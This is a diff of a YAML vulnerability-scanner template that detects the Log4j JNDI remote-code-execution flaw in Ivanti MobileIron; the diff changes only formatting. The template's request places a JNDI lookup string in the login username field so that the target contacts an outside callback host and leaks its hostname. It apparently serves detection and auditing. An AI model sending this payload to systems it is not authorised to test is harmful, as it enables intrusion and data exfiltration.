@@ -1,9 +1,11 @@
 id: mobileiron-log4j-jndi-rce
+
 info:
   name: Ivanti MobileIron Log4J JNDI RCE
   author: meme-lord
   severity: critical
-  description: Ivanti MobileIron Apache Log4j2 <=2.14.1 JNDI in features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  description: Ivanti MobileIron Apache Log4j2 <=2.14.1 JNDI in features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker
+    who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
   reference:
     - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
     - https://www.lunasec.io/docs/blog/log4j-zero-day/
@@ -17,6 +19,7 @@ info:
     verified: true
     shodan-query: http.html:"MobileIron"
   tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron
+
 requests:
   - raw:
       - |
@@ -25,21 +28,24 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&logincontext=employee
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
+
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+
     extractors:
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
 
 # Enhanced by cs on 2022/02/28
